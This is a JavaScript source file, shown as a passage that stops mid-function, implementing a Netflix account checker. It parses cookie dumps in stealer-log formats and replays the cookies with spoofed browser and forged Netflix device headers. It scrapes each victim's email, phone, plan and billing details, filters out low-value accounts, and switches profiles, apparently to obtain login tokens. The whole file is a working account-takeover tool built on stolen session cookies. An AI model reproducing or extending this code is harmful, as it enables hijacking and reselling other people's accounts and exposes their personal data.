const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const NETFLIX_HOME_URL = 'https://www.netflix.com/';
const NETFLIX_ACCOUNT_URL = 'https://www.netflix.com/account?locale=en-US';
const NETFLIX_PROFILE_SWITCH_URL =
  'https://www.netflix.com/nq/website/memberapi/release/profiles/switch';
const NFTOKEN_API_URL = 'https://android13.prod.ftl.netflix.com/graphql';
const DIRECT_TIMEOUT_MS = 8000;
const MAX_DIRECT_ATTEMPTS_PER_REQUEST = 1;
const TOKEN_TIMEOUT_MS = 12000;
const DIRECT_RETRYABLE_STATUS_CODES = new Set([408, 429]);
const COUNTRY_NAME_SOURCE_LOCALES = [
  'en',
  'ar',
  'es',
  'fr',
  'de',
  'it',
  'pt',
  'tr',
  'ru',
  'hi',
  'id',
  'vi',
  'th',
  'ja',
  'ko',
  'zh-CN',
  'zh-TW',
];
const MEMBERSHIP_STATUS_LABELS = {
  CURRENTMEMBER: 'Current Member',
  FORMERMEMBER: 'Former Member',
  NEVERMEMBER: 'Never Member',
  ANONYMOUS: 'Anonymous',
  UNKNOWN: 'Unknown',
  ONHOLD: 'On Hold',
  PASTDUE: 'Past Due',
  CANCELED: 'Canceled',
  CANCELLED: 'Canceled',
  PENDINGCANCEL: 'Pending Cancel',
};
let COUNTRY_NAME_LOOKUP_CACHE = null;
const COOKIE_ATTRIBUTE_NAMES = new Set([
  'path',
  'domain',
  'expires',
  'max-age',
  'secure',
  'httponly',
  'samesite',
  'priority',
  'partitioned',
  'sameparty',
  'comment',
  'version',
  'hostonly',
  'session',
  'storeid',
  'id',
  'url',
  'size',
  'sourceport',
  'sourcescheme',
  'partitionkey',
  'creation',
  'lastaccessed',
]);

class NetflixAccountChecker {
  constructor() {
    this.results = { valid: [], invalid: [] };
    this.validCookies = [];
  }

  parseCookieFile(filePath) {
    const content = fs.readFileSync(filePath, 'utf-8');
    const lines = content.split('\n');
    const cookies = new Map();

    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed) continue;
      if (line.startsWith('#') && !line.includes('HttpOnly')) continue;

      const cleanLine = line.replace('#HttpOnly_', '').trim();
      const parts = cleanLine.split('\t');
      if (parts.length >= 7) {
        const name = parts[5].trim();
        const value = parts[6].trim();
        if (name && value) {
          cookies.set(name, value.replace(/[\r\n]/g, ''));
        }
      }
    }

    if (cookies.size > 0) {
      return Array.from(cookies.entries())
        .map(([name, value]) => `${name}=${value}`)
        .join('; ');
    }

    const rawCookies = new Map();
    const rawCandidates = lines
      .map((line) => line.trim())
      .filter(Boolean)
      .flatMap((line) => {
        const cookieFieldMatch = line.match(/\|\s*cookie\s*=\s*(.+)$/i);
        if (cookieFieldMatch?.[1]) {
          return [cookieFieldMatch[1].trim()];
        }
        return line
          .split('|')
          .map((segment) => segment.trim())
          .filter(Boolean);
      });

    for (const candidate of rawCandidates) {
      for (const token of candidate.split(';')) {
        const trimmedToken = token.trim();
        if (!trimmedToken) continue;
        const separatorIndex = trimmedToken.indexOf('=');
        if (separatorIndex <= 0) continue;

        const name = trimmedToken.slice(0, separatorIndex).trim();
        if (!name || COOKIE_ATTRIBUTE_NAMES.has(name.toLowerCase())) continue;

        const value = trimmedToken
          .slice(separatorIndex + 1)
          .trim()
          .replace(/[\r\n]/g, '');
        if (!value) continue;
        rawCookies.set(name, value);
      }
    }

    return Array.from(rawCookies.entries())
      .map(([name, value]) => `${name}=${value}`)
      .join('; ');
  }

  shouldRetryDirect(statusCode) {
    return DIRECT_RETRYABLE_STATUS_CODES.has(statusCode) || statusCode >= 500;
  }

  isRetryableNetworkError(error) {
    if (!error || typeof error !== 'object') {
      return false;
    }

    const code = String(error.code ?? '').toUpperCase();
    if (code === 'ECONNABORTED' || code === 'ETIMEDOUT' || code === 'ECONNRESET') {
      return true;
    }

    const message = String(error.message ?? '').toLowerCase();
    return (
      message.includes('timeout') ||
      message.includes('econnrefused') ||
      message.includes('socket hang up')
    );
  }

  buildAccountRequestConfig(cookieString, timeoutMs) {
    return {
      headers: {
        Cookie: cookieString,
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        Accept:
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        Referer: 'https://www.netflix.com/browse',
      },
      validateStatus: () => true,
      timeout: timeoutMs,
    };
  }

  async fetchAccountHtml(cookieString, url = NETFLIX_ACCOUNT_URL) {
    if (cookieString.includes('\n') || cookieString.includes('\r')) {
      throw new Error('Cookie contains invalid newline characters');
    }

    const requestConfig = this.buildAccountRequestConfig(cookieString, DIRECT_TIMEOUT_MS);
    let directError = null;
    for (let attempt = 0; attempt < MAX_DIRECT_ATTEMPTS_PER_REQUEST; attempt += 1) {
      try {
        const directResponse = await axios.get(url, { ...requestConfig, proxy: false });
        if (
          this.shouldRetryDirect(directResponse.status) &&
          attempt + 1 < MAX_DIRECT_ATTEMPTS_PER_REQUEST
        ) {
          continue;
        }

        return directResponse;
      } catch (error) {
        directError = error;
        const message = error instanceof Error ? error.message : String(error);
        console.warn(`[direct] request failed: ${message}`);

        if (
          attempt + 1 >= MAX_DIRECT_ATTEMPTS_PER_REQUEST ||
          !this.isRetryableNetworkError(error)
        ) {
          break;
        }
      }
    }

    if (directError instanceof Error) {
      throw directError;
    }

    throw new Error('Request failed: no successful direct response.');
  }

  extractJsonField(html, key) {
    const m = html.match(new RegExp(`"${key}"\\s*:\\s*"([^"]+)"`));
    return m ? m[1] : null;
  }

  extractByRegex(html, regex) {
    const m = html.match(regex);
    return m ? m[1] : null;
  }

  extractAssignedObjectBlocks(source, marker) {
    const input = typeof source === 'string' ? source : '';
    if (!input) {
      return [];
    }

    const flags = marker.flags.includes('g') ? marker.flags : `${marker.flags}g`;
    const matcher = new RegExp(marker.source, flags);
    const blocks = [];
    let markerMatch = matcher.exec(input);

    while (markerMatch) {
      let cursor = markerMatch.index + markerMatch[0].length;
      while (cursor < input.length && /\s/.test(input[cursor])) {
        cursor += 1;
      }

      if (input[cursor] !== '{') {
        markerMatch = matcher.exec(input);
        continue;
      }

      let depth = 0;
      let inString = false;
      let quoteChar = '';
      let escaped = false;
      let block = null;

      for (let index = cursor; index < input.length; index += 1) {
        const char = input[index];

        if (inString) {
          if (escaped) {
            escaped = false;
            continue;
          }

          if (char === '\\') {
            escaped = true;
            continue;
          }

          if (char === quoteChar) {
            inString = false;
            quoteChar = '';
          }
          continue;
        }

        if (char === '"' || char === "'") {
          inString = true;
          quoteChar = char;
          continue;
        }

        if (char === '{') {
          depth += 1;
        } else if (char === '}') {
          depth -= 1;
          if (depth === 0) {
            block = input.slice(cursor, index + 1);
            matcher.lastIndex = index + 1;
            break;
          }
        }
      }

      if (block) {
        blocks.push(block);
      }

      markerMatch = matcher.exec(input);
    }

    return blocks;
  }

  extractReactContextBlocks(html) {
    return this.extractAssignedObjectBlocks(html, /netflix\.reactContext\s*=\s*/g);
  }

  parseScriptAssignedObject(block) {
    if (!block || typeof block !== 'string') {
      return null;
    }

    try {
      const normalized = block.replace(
        /\\x([0-9a-fA-F]{2})/g,
        (_, hex) => `\\u00${hex}`
      );
      return JSON.parse(normalized);
    } catch {
      return null;
    }
  }

  getNestedValue(source, path) {
    if (!source || typeof source !== 'object' || !Array.isArray(path)) {
      return null;
    }

    let cursor = source;
    for (const key of path) {
      if (!cursor || typeof cursor !== 'object' || !(key in cursor)) {
        return null;
      }
      cursor = cursor[key];
    }

    return cursor;
  }

  getFlowFieldValue(field) {
    if (field == null) {
      return null;
    }

    if (field && typeof field === 'object' && 'value' in field) {
      return field.value ?? null;
    }

    return field;
  }

  parseDateCandidate(value) {
    if (value == null || value === '') {
      return { raw: null, friendly: null };
    }

    if (typeof value === 'string') {
      const trimmed = this.decodeEscapedText(value, true);
      if (!trimmed) {
        return { raw: null, friendly: null };
      }

      if (/^\d+$/.test(trimmed)) {
        const asNumber = Number.parseInt(trimmed, 10);
        if (Number.isFinite(asNumber)) {
          return this.parseDateFriendly(asNumber);
        }
      }

      return this.parseDateFriendly(trimmed);
    }

    return this.parseDateFriendly(value);
  }

  assignParsedDateFields(target, rawKey, friendlyKey, value) {
    const parsed = this.parseDateCandidate(value);
    target[rawKey] = parsed.raw;
    target[friendlyKey] = parsed.friendly;
  }

  extractFromReactContext(html) {
    for (const block of this.extractReactContextBlocks(html)) {
      const reactContext = this.parseScriptAssignedObject(block);
      if (!reactContext || typeof reactContext !== 'object') {
        continue;
      }

      const models = reactContext.models || {};
      const signupContextData = this.getNestedValue(models, ['signupContext', 'data']) || {};
      const flow =
        signupContextData.flow ||
        this.getNestedValue(models, ['flow', 'data']) ||
        null;
      const flowFields = flow?.fields || {};
      const currentPlanFields = flowFields?.currentPlan?.fields || {};
      const userInfo =
        signupContextData.userInfo ||
        this.getNestedValue(models, ['userInfo', 'data']) ||
        {};

      const growthAccount = this.getNestedValue(models, [
        'graphql',
        'data',
        'ROOT_QUERY',
        'growthAccount({"contextInput":{"growthInputNode":"YOUR_ACCOUNT"}})',
      ]);

      const growthPlan = this.getNestedValue(growthAccount, ['currentPlan', 'plan']) || {};
      const growthHoldMetadata = this.getNestedValue(growthAccount, ['growthHoldMetadata']) || {};
      const growthPhone = this.getNestedValue(growthAccount, ['growthLocalizablePhoneNumber']) || {};

      const plan =
        this.getFlowFieldValue(currentPlanFields.localizedPlanName) ||
        growthPlan.name ||
        null;
      const planId =
        this.getFlowFieldValue(currentPlanFields.planId) ||
        growthPlan.planId ||
        null;
      const maxStreams =
        this.getFlowFieldValue(currentPlanFields.maxStreams) ||
        this.getNestedValue(flowFields, ['maxStreams', 'value']) ||
        null;
      const price =
        this.getFlowFieldValue(currentPlanFields.planPrice) ||
        this.getNestedValue(growthPlan, ['price', 'formatted']) ||
        null;

      const memberSinceValue = this.getFlowFieldValue(flowFields.memberSince);
      const growthMemberSince = this.getNestedValue(growthAccount, ['memberSince']);
      const memberSinceIso = growthMemberSince
        ? this.parseDateCandidate(growthMemberSince).raw || this.decodeEscapedText(growthMemberSince)
        : this.parseDateCandidate(memberSinceValue).raw;
      const memberSince =
        userInfo.memberSince ||
        (memberSinceIso ? this.parseDateCandidate(memberSinceIso).friendly : null);

      const nextBillingCandidate =
        this.getNestedValue(growthAccount, ['nextBillingDate', 'date']) ||
        this.getNestedValue(growthAccount, ['nextBillingDate', 'localDate']) ||
        this.getFlowFieldValue(flowFields.nextBillingDate) ||
        null;
      const nextBilling = this.parseDateCandidate(nextBillingCandidate);

      const membershipEndCandidate =
        this.getNestedValue(growthAccount, ['membershipEndDate', 'date']) ||
        this.getFlowFieldValue(flowFields.membershipEndDate) ||
        this.getFlowFieldValue(flowFields.membershipEndRaw) ||
        null;
      const membershipEnd = this.parseDateCandidate(membershipEndCandidate);

      const accountFromReactContext = {
        userGuid: userInfo.userGuid || userInfo.guid || null,
        authURL: userInfo.authURL || null,
        email: userInfo.emailAddress || null,
        plan,
        planId,
        memberSinceIso,
        memberSince,
        countryOfSignup:
          userInfo.countryOfSignup ||
          this.getNestedValue(growthAccount, ['countryOfSignUp', 'code']) ||
          null,
        currentRegion:
          userInfo.currentCountry ||
          this.getNestedValue(models, ['geo', 'data', 'requestCountry', 'id']) ||
          null,
        nextBillingRaw: nextBilling.raw,
        nextBilling: nextBilling.friendly,
        membershipEndRaw: membershipEnd.raw,
        membershipEndDate: membershipEnd.friendly,
        membershipStatus: userInfo.membershipStatus || growthAccount?.membershipStatus || null,
        phone:
          this.normalizePhone(growthPhone.value) ||
          this.normalizePhone(userInfo.phoneNumber) ||
          null,
        phoneVerified:
          growthPhone.isVerified == null ? null : Boolean(growthPhone.isVerified),
        maxStreams,
        price,
        isUserOnHold:
          growthHoldMetadata.isUserOnHold == null
            ? null
            : Boolean(growthHoldMetadata.isUserOnHold),
      };

      return accountFromReactContext;
    }

    return {};
  }

  decodeEscapedText(value, collapseWhitespace = false) {
    if (value == null) return value;
    let normalized = String(value)
      .replace(/\\u([0-9a-fA-F]{4})/g, (_, hex) =>
        String.fromCharCode(parseInt(hex, 16))
      )
      .replace(/\\x([0-9a-fA-F]{2})/g, (_, hex) =>
        String.fromCharCode(parseInt(hex, 16))
      )
      .replace(/\u00a0/g, ' ');

    if (collapseWhitespace) {
      normalized = normalized.replace(/[ \t\r\f\v]+/g, ' ');
    }

    return normalized.trim();
  }

  normalizeForLookup(value) {
    const decoded = this.decodeEscapedText(value, true);
    if (!decoded) return '';

    let normalized = decoded.normalize('NFKD').replace(/[\u0300-\u036f]/g, '');
    try {
      normalized = normalized.replace(/[^\p{L}\p{N}]+/gu, ' ');
    } catch {
      normalized = normalized.replace(/[^A-Za-z0-9]+/g, ' ');
    }

    return normalized.trim().toLowerCase();
  }

  buildCountryNameLookup() {
    if (COUNTRY_NAME_LOOKUP_CACHE) {
      return COUNTRY_NAME_LOOKUP_CACHE;
    }

    const lookup = new Map();
    const englishDisplay = new Intl.DisplayNames(['en'], { type: 'region' });
    let regionCodes = [];
    if (typeof Intl.supportedValuesOf === 'function') {
      try {
        regionCodes = Intl.supportedValuesOf('region');
      } catch {
        regionCodes = [];
      }
    }

    if (regionCodes.length === 0) {
      for (let first = 65; first <= 90; first += 1) {
        for (let second = 65; second <= 90; second += 1) {
          const code = String.fromCharCode(first) + String.fromCharCode(second);
          const resolved = englishDisplay.of(code);
          const isUnknown =
            !resolved ||
            resolved === code ||
            String(resolved).toLowerCase().includes('unknown');
          if (!isUnknown) {
            regionCodes.push(code);
          }
        }
      }
    }

    const localizedDisplays = COUNTRY_NAME_SOURCE_LOCALES.map((locale) => {
      try {
        return new Intl.DisplayNames([locale], { type: 'region' });
      } catch {
        return null;
      }
    }).filter(Boolean);

    const registerName = (name, englishName) => {
      const key = this.normalizeForLookup(name);
      if (key && !lookup.has(key)) {
        lookup.set(key, englishName);
      }
    };

    for (const code of regionCodes) {
      const englishName = englishDisplay.of(code);
      if (!englishName || englishName === code) {
        continue;
      }

      registerName(code, englishName);
      registerName(englishName, englishName);

      for (const display of localizedDisplays) {
        const localizedName = display.of(code);
        if (localizedName && localizedName !== code) {
          registerName(localizedName, englishName);
        }
      }
    }

    COUNTRY_NAME_LOOKUP_CACHE = lookup;
    return lookup;
  }

  toEnglishMembershipStatus(value) {
    const text = this.decodeEscapedText(value, true);
    if (!text) return null;

    const compactKey = text.toUpperCase().replace(/[^A-Z]/g, '');
    const mapped = MEMBERSHIP_STATUS_LABELS[compactKey];
    if (mapped) return mapped;

    const normalized = this.normalizeForLookup(text);
    if (normalized.includes('anonymous') || /مجهول/.test(text)) {
      return 'Anonymous';
    }
    if (normalized.includes('active') || normalized.includes('current')) {
      return 'Current Member';
    }

    const pretty = text
      .replace(/([a-z])([A-Z])/g, '$1 $2')
      .replace(/[_\s]+/g, ' ')
      .trim();
    return pretty || text;
  }

  toEnglishPlanName(value, maxStreams = null) {
    const text = this.decodeEscapedText(value, true);
    const normalized = this.normalizeForLookup(text || '');
    const source = `${normalized} ${(text || '').toLowerCase()}`;

    if (
      /\b(mobile|movil|móvil|mobil|mobiel)\b/.test(source) ||
      /(جوال|موبايل|الهاتف)/.test(source)
    ) {
      return 'Mobile';
    }
    if (
      /\b(premium|premier|premio)\b/.test(source) ||
      /(بريميوم|برايميوم|ممتاز|فائق)/.test(source)
    ) {
      return 'Premium';
    }
    if (
      /\b(standard|estandar|estándar|std)\b/.test(source) ||
      /(قياسي|ستاندرد)/.test(source)
    ) {
      return 'Standard';
    }
    if (
      /\b(basic|basico|básico|basique)\b/.test(source) ||
      /(اساسي|أساسي)/.test(source)
    ) {
      return 'Basic';
    }

    const streamCount = Number.parseInt(String(maxStreams ?? ''), 10);
    if (Number.isFinite(streamCount)) {
      if (streamCount >= 4) return 'Premium';
      if (streamCount === 2) return 'Standard';
      if (streamCount === 1) return 'Basic';
    }

    return text || null;
  }

  normalizePhone(value) {
    const decoded = this.decodeEscapedText(value, true);
    if (decoded == null) return null;
    return decoded || null;
  }

  normalizeCountryName(value) {
    if (value == null) return null;
    const text = this.decodeEscapedText(value, true);
    if (!text) return null;

    const upper = text.toUpperCase();
    if (/^[A-Z]{2}$/.test(upper) || /^\d{3}$/.test(upper)) {
      const locales = ['en', 'en-US', 'en-GB'];
      for (const locale of locales) {
        try {
          const display = new Intl.DisplayNames([locale], { type: 'region' });
          const resolved = display.of(upper);
          const isUnknown =
            typeof resolved === 'string' && resolved.toLowerCase().includes('unknown');
          if (resolved && resolved !== upper && !isUnknown) {
            return resolved;
          }
        } catch {}
      }
      return text;
    }

    const lookup = this.buildCountryNameLookup();
    const mapped = lookup.get(this.normalizeForLookup(text));
    if (mapped) {
      return mapped;
    }

    return text;
  }

  normalizeCurrencyCode(value) {
    if (value == null) return null;
    const code = String(value).trim().toUpperCase();
    if (/^[A-Z]{3}$/.test(code)) return code;
    return null;
  }

  parseAmountFromPrice(rawPrice) {
    if (rawPrice == null) return { amount: null, fractionDigits: 0 };
    const text = this.decodeEscapedText(rawPrice, true);
    const numericRaw = text.replace(/[^0-9,.\-]/g, '');
    if (!numericRaw) return { amount: null, fractionDigits: 0 };

    let normalized = numericRaw;
    let fractionDigits = 0;
    const commaCount = (numericRaw.match(/,/g) || []).length;
    const dotCount = (numericRaw.match(/\./g) || []).length;

    if (commaCount > 0 && dotCount > 0) {
      if (numericRaw.lastIndexOf(',') > numericRaw.lastIndexOf('.')) {
        normalized = numericRaw.replace(/\./g, '').replace(',', '.');
      } else {
        normalized = numericRaw.replace(/,/g, '');
      }
      const m = normalized.match(/\.(\d+)$/);
      fractionDigits = m ? m[1].length : 0;
    } else if (commaCount > 0) {
      if (commaCount > 1) {
        normalized = numericRaw.replace(/,/g, '');
      } else if (/^\-?\d+,\d{1,2}$/.test(numericRaw)) {
        normalized = numericRaw.replace(',', '.');
        fractionDigits = (normalized.split('.')[1] || '').length;
      } else {
        normalized = numericRaw.replace(/,/g, '');
      }
    } else if (dotCount > 0) {
      if (dotCount > 1) {
        normalized = numericRaw.replace(/\./g, '');
      } else if (/^\-?\d+\.\d{1,2}$/.test(numericRaw)) {
        fractionDigits = (numericRaw.split('.')[1] || '').length;
      } else if (/^\-?\d+\.\d{3}$/.test(numericRaw)) {
        normalized = numericRaw.replace(/\./g, '');
      }
    }

    normalized = normalized.replace(/(?!^)-/g, '');
    const amount = Number.parseFloat(normalized);
    if (!Number.isFinite(amount)) {
      return { amount: null, fractionDigits: 0 };
    }
    return { amount, fractionDigits };
  }

  resolveCurrencyCode(priceValue, currencyValue) {
    const byField = this.normalizeCurrencyCode(currencyValue);
    if (byField) return byField;
    const text = this.decodeEscapedText(priceValue, true);
    const byPrice = text ? text.match(/\b([A-Za-z]{3})\b/) : null;
    return byPrice ? this.normalizeCurrencyCode(byPrice[1]) : null;
  }

  getCurrencySymbol(currencyCode) {
    const code = this.normalizeCurrencyCode(currencyCode);
    if (!code) return null;

    const overrides = {
      EGP: 'E£',
    };
    if (overrides[code]) return overrides[code];

    const candidates = [
      { locale: 'en-US', display: 'narrowSymbol' },
      { locale: 'en-GB', display: 'narrowSymbol' },
      { locale: 'en-EG', display: 'narrowSymbol' },
      { locale: 'en-US', display: 'symbol' },
      { locale: 'en-EG', display: 'symbol' },
      { locale: 'ar-EG', display: 'symbol' },
    ];

    for (const candidate of candidates) {
      try {
        const fmt = new Intl.NumberFormat(candidate.locale, {
          style: 'currency',
          currency: code,
          currencyDisplay: candidate.display,
          minimumFractionDigits: 0,
          maximumFractionDigits: 0,
        });
        const part = fmt.formatToParts(0).find((p) => p.type === 'currency')?.value;
        if (part && part.toUpperCase() !== code) {
          return part;
        }
      } catch {}
    }

    return code;
  }

  formatPriceWithSymbol(priceValue, currencyValue) {
    if (priceValue == null) return null;
    const text = this.decodeEscapedText(priceValue, true);
    if (!text) return null;

    const currencyCode = this.resolveCurrencyCode(text, currencyValue);
    const parsed = this.parseAmountFromPrice(text);
    if (!currencyCode || parsed.amount == null) {
      return text;
    }

    try {
      const symbol = this.getCurrencySymbol(currencyCode) || currencyCode;
      const fmt = new Intl.NumberFormat('en-US', {
        style: 'currency',
        currency: currencyCode,
        currencyDisplay: 'symbol',
        minimumFractionDigits: parsed.fractionDigits,
        maximumFractionDigits: parsed.fractionDigits,
      });
      const rendered = fmt
        .formatToParts(parsed.amount)
        .map((part) => (part.type === 'currency' ? symbol : part.value))
        .join('');
      return rendered.replace(/\u00a0/g, ' ').trim();
    } catch {
      const numberText = new Intl.NumberFormat('en-US', {
        minimumFractionDigits: parsed.fractionDigits,
        maximumFractionDigits: parsed.fractionDigits,
      }).format(parsed.amount);
      const symbol = this.getCurrencySymbol(currencyCode) || currencyCode;
      return symbol === currencyCode ? `${currencyCode} ${numberText}` : `${symbol}${numberText}`;
    }
  }

  parseDateFriendly(value) {
    if (!value) return { raw: null, friendly: null };
    const d = new Date(value);
    if (Number.isNaN(d.getTime())) {
      return { raw: value, friendly: value };
    }
    const friendly = d.toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'long',
      day: 'numeric',
    });
    return { raw: d.toISOString(), friendly };
  }

  calcDaysDiff(dateValue) {
    try {
      const d = new Date(dateValue);
      if (Number.isNaN(d.getTime())) return null;
      const today = new Date();
      const diffMs = d - today;
      return Math.ceil(diffMs / (1000 * 60 * 60 * 24));
    } catch {
      return null;
    }
  }

  getFinalResponseUrl(res) {
    return (
      res?.request?.res?.responseUrl ||
      res?.request?._redirectable?._currentUrl ||
      null
    );
  }

  isLoggedIn(html, finalUrl = '') {
    const source = `${finalUrl || ''}\n${html || ''}`.toLowerCase();

    const loggedOutMarkers = [
      '/login',
      'name="userloginid"',
      'name="password"',
      'data-uia="login-field"',
      'data-uia="password-field"',
      'login-form',
      'id_userloginid',
      'id_password',
      'simplemember/getstarted',
    ];

    const loggedInMarkers = [
      '"userguid"',
      '"authurl"',
      '"profiles"',
      'your account',
      'account settings',
      'membershipstatus',
      'growthaccount',
      '/account/subscription',
    ];

    const hasLoggedOut = loggedOutMarkers.some((s) => source.includes(s));
    const hasLoggedIn = loggedInMarkers.some((s) => source.includes(s));
    return hasLoggedIn && !hasLoggedOut;
  }

  hasRealAccountSignals(account) {
    if (!account || typeof account !== 'object') return false;

    const membershipStatus = String(account.membershipStatus || '')
      .trim()
      .toUpperCase();
    if (
      membershipStatus &&
      membershipStatus !== 'ANONYMOUS' &&
      membershipStatus !== 'UNKNOWN'
    ) {
      return true;
    }

    const fields = [
      account.userGuid,
      account.email,
      account.plan,
      account.planId,
      account.memberSinceIso,
      account.memberSince,
      account.countryOfSignup,
      account.currentRegion,
      account.nextBillingRaw,
      account.membershipEndRaw,
    ];

    if (fields.some((value) => value != null && String(value).trim() !== '')) {
      return true;
    }

    return false;
  }

  getDisqualificationReasons(account) {
    const reasons = [];
    if (!account || typeof account !== 'object') {
      return reasons;
    }

    const normalizedPlan = this.toEnglishPlanName(account.plan, account.maxStreams);
    const normalizedMembershipStatus = this.toEnglishMembershipStatus(
      account.membershipStatus
    );
    const isBasicPlan = normalizedPlan && normalizedPlan.trim().toLowerCase() === 'basic';
    const isFormerMember =
      normalizedMembershipStatus &&
      normalizedMembershipStatus.trim().toLowerCase() === 'former member';

    if (isBasicPlan) {
      reasons.push('Basic plan');
    }

    if (isFormerMember) {
      reasons.push('Former Member');
    }

    const daysUntilExpirationRaw = Number.parseInt(
      String(account.daysUntilExpiration ?? ''),
      10
    );
    const isOverdueByDate =
      Number.isFinite(daysUntilExpirationRaw) && daysUntilExpirationRaw < 0;
    const isOnHold = account.isUserOnHold === true || account.paymentHold === true;

    if (isOnHold || isOverdueByDate) {
      reasons.push('Overdue membership');
    }

    return reasons;
  }

  toCookieMap(cookieString) {
    const cookies = new Map();
    if (typeof cookieString !== 'string') {
      return cookies;
    }

    for (const pair of cookieString.split(';')) {
      const trimmed = pair.trim();
      if (!trimmed) {
        continue;
      }

      const separatorIndex = trimmed.indexOf('=');
      if (separatorIndex <= 0) {
        continue;
      }

      const name = trimmed.slice(0, separatorIndex).trim();
      const value = trimmed.slice(separatorIndex + 1).trim();
      if (!name) {
        continue;
      }

      cookies.set(name, value);
    }

    return cookies;
  }

  toCookieHeader(cookieMap) {
    if (!(cookieMap instanceof Map) || cookieMap.size === 0) {
      return '';
    }

    return Array.from(cookieMap.entries())
      .map(([name, value]) => `${name}=${value}`)
      .join('; ');
  }

  applySetCookies(cookieMap, setCookieHeaders) {
    if (!(cookieMap instanceof Map)) {
      return false;
    }

    const entries = Array.isArray(setCookieHeaders)
      ? setCookieHeaders
      : typeof setCookieHeaders === 'string'
        ? [setCookieHeaders]
        : [];
    let updated = false;

    for (const setCookie of entries) {
      if (typeof setCookie !== 'string') {
        continue;
      }

      const [firstChunk] = setCookie.split(';');
      const separatorIndex = firstChunk.indexOf('=');
      if (separatorIndex <= 0) {
        continue;
      }

      const name = firstChunk.slice(0, separatorIndex).trim();
      const value = firstChunk.slice(separatorIndex + 1).trim();
      if (!name) {
        continue;
      }

      cookieMap.set(name, value);
      updated = true;
    }

    return updated;
  }

  normalizeTokenContextValue(value) {
    const normalized = this.decodeEscapedText(value, true);
    return normalized || null;
  }

  extractProfileGuid(cookieMap) {
    if (!(cookieMap instanceof Map)) {
      return null;
    }

    const candidateCookieNames = ['NetflixId', 'SecureNetflixId'];
    const patterns = [/[?&]pg=([^&;]+)/i, /[?&]guid=([^&;]+)/i];

    for (const cookieName of candidateCookieNames) {
      const rawValue = cookieMap.get(cookieName);
      if (!rawValue || typeof rawValue !== 'string') {
        continue;
      }

      let decoded = rawValue;
      for (let depth = 0; depth < 3; depth += 1) {
        for (const pattern of patterns) {
          const match = decoded.match(pattern);
          if (!match?.[1]) {
            continue;
          }

          try {
            return decodeURIComponent(match[1]);
          } catch {
            return match[1];
          }
        }

        try {
          const nextDecoded = decodeURIComponent(decoded);
          if (nextDecoded === decoded) {
            break;
          }
          decoded = nextDecoded;
        } catch {
          break;
        }
      }
    }

    return null;
  }

  createRandomEsn() {
    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const bytes = crypto.randomBytes(24);
    let suffix = '';
    for (const byte of bytes) {
      suffix += alphabet[byte % alphabet.length];
    }
    return `NFCDCH-02-NFCDCH-02-${suffix}`;
  }

  createNetflixRequestId() {
    if (typeof crypto.randomUUID === 'function') {
      return crypto.randomUUID().replace(/-/g, '');
    }
    return crypto.randomBytes(16).toString('hex');
  }

  async bootstrapTokenContext(cookieHeader) {
    const response = await axios.get(NETFLIX_HOME_URL, {
      headers: {
        Cookie: cookieHeader,
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
        Accept:
          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
      },
      timeout: TOKEN_TIMEOUT_MS,
      validateStatus: () => true,
      proxy: false,
    });

    const html =
      typeof response.data === 'string'
        ? response.data
        : JSON.stringify(response.data ?? '');
    const bootstrapUserGuid =
      this.normalizeTokenContextValue(this.extractJsonField(html, 'userGuid')) ||
      this.normalizeTokenContextValue(this.extractJsonField(html, 'guid'));
    const cookieMap = this.toCookieMap(cookieHeader);
    this.applySetCookies(cookieMap, response?.headers?.['set-cookie']);

    return {
      status: response.status,
      cookieHeader: this.toCookieHeader(cookieMap) || cookieHeader,
      buildId: this.normalizeTokenContextValue(this.extractJsonField(html, 'BUILD_IDENTIFIER')),
      authURL: this.normalizeTokenContextValue(this.extractJsonField(html, 'authURL')),
      userGuid: bootstrapUserGuid,
    };
  }

  async switchProfileForToken({
    cookieHeader,
    profileGuid,
    authURL,
    buildId,
    userGuid,
  }) {
    if (!profileGuid || !authURL) {
      return { switched: false, status: null, cookieHeader };
    }

    const response = await axios.get(NETFLIX_PROFILE_SWITCH_URL, {
      params: {
        switchProfileGuid: profileGuid,
        _: Date.now(),
        authURL,
      },
      headers: {
        Cookie: cookieHeader,
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
        Accept: '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        Pragma: 'no-cache',
        Referer: 'https://www.netflix.com/browse',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'x-netflix.browsername': 'Chrome',
        'x-netflix.browserversion': '145',
        'x-netflix.client.request.name': 'ui/xhrUnclassified',
        'x-netflix.clienttype': 'akira',
        'x-netflix.esn': this.createRandomEsn(),
        'x-netflix.esnprefix': 'NFCDCH-02-',
        'x-netflix.nq.stack': 'prod',
        'x-netflix.osfullname': 'Windows 10',
        'x-netflix.osname': 'Windows',
        'x-netflix.osversion': '10.0',
        'x-netflix.request.attempt': '1',
        'x-netflix.request.client.context': '{"appstate":"foreground"}',
        'x-netflix.request.client.user.guid': userGuid || '',
        'x-netflix.request.id': this.createNetflixRequestId(),
        'x-netflix.uiversion': buildId || 'vd6517bb6',
      },
      timeout: TOKEN_TIMEOUT_MS,
      validateStatus: () => true,
      proxy: false,
    });

    const cookieMap = this.toCookieMap(cookieHeader);
    this.applySetCookies(cookieMap, response?.headers?.['set-cookie']);
    const nextCookieHeader = this.toCookieHeader(cookieMap) || cookieHeader;

    return {
      switched: true,
      status: response.status,
      cookieHeader: nextCookieHeader,
